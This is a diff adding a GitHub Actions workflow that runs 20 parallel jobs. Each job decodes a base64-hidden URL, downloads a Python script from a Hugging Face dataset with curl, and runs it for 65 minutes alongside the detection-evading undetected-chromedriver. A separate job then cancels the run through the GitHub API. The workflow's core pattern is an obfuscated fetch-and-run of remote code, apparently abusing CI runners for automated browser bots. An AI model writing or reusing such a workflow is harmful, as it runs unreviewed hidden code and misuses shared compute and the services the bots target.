@@ -1,0 +1,107 @@
+name: Linux Consolidated Task Brigade
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: consolidated-brigade-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # قائد التصفية الكاملة: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  purge-commander:
+    name: "Purge Commander"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Activate Total Purge Sequence
+        run: |
+          echo "[COMMANDER] Purge commander standing ready. Full eradication armed at the 65-minute marker."
+          echo "[COMMANDER] Reading workflow badge: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[COMMANDER] Marker reached! Activating total purge sequence..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[COMMANDER] Total purge sequence activated. Every running and scheduled unit will be purged."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات اللواء
+  # =================================================================
+  form-brigade:
+    name: "BrigadeUnit-${{ matrix.unit_designator }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_designator: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      # ⟤ الوحدة الأولى: تركيب البنية الأساسية
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      - name: Install Core Structure
+        run: |
+          echo "[CORE] Installing core structure for BrigadeUnit-${{ matrix.unit_designator }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      # ⟤ الوحدة الثانية: انتزاع النص التنفيذي
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      - name: Extract Execution Text
+        run: |
+          echo "[EXTRACT] Extracting app_task.py from assigned vault cache..."
+          VAULT_CACHE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$VAULT_CACHE" -o app_task.py
+          echo "[EXTRACT] Execution text extracted successfully."
+
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      # ⟤ الوحدة الثالثة: تثبيت الحزم المرافقة
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      - name: Bind Accompanying Packages
+        run: |
+          echo "[BIND] Binding accompanying packages..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      # ⟤ الوحدة الرابعة: التنفيذ المقيّد بالمدة (65 دقيقة)
+      # ▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣
+      - name: Operate Within Time Capsule
+        run: |
+          echo ">> Forming BrigadeUnit-${{ matrix.unit_designator }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          BRIGADE_PID=$!
+          
+          echo ">> Time capsule sealed. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $BRIGADE_PID 2>/dev/null; then
+            echo ">> Time capsule opened! Retiring operation..."
+            kill -9 $BRIGADE_PID
+            echo ">> Operation retired by capsule keeper."
+          else
+            echo ">> Operation closed within time capsule."
+          fi
